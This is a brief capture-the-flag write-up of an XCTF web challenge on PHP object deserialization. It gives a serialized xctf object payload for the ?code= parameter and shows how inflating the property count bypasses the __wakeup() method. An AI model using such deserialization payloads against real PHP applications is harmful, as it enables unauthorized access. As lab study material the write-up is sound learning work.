# Challenge: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1

<img width="251" alt="class xctf{" src="https://user-images.githubusercontent.com/48151790/126886407-0a5cb22f-2aad-40b3-8740-a0ff92c49081.png">

. Hint: ?code=object serialize

. Create serialize of object xctf

<img width="725" alt="Screen Shot 2021-07-25 at 10 14 34" src="https://user-images.githubusercontent.com/48151790/126886492-bf176acd-b496-4d5a-a2a1-e1f709ea2b27.png">

=> object serialize: O:4:"xctf":1:{s:4:"flag";s:3:"111";

. Function __wakeup() of class xctf will run before object unserialize

=> Bypass: O:4:"xctf":2:{s:4:"flag";s:3:"111";}

<img width="766" alt="Screen Shot 2021-07-25 at 10 20 51" src="https://user-images.githubusercontent.com/48151790/126886593-2d2cb901-5ab9-4312-a2e2-cb5a26595483.png">
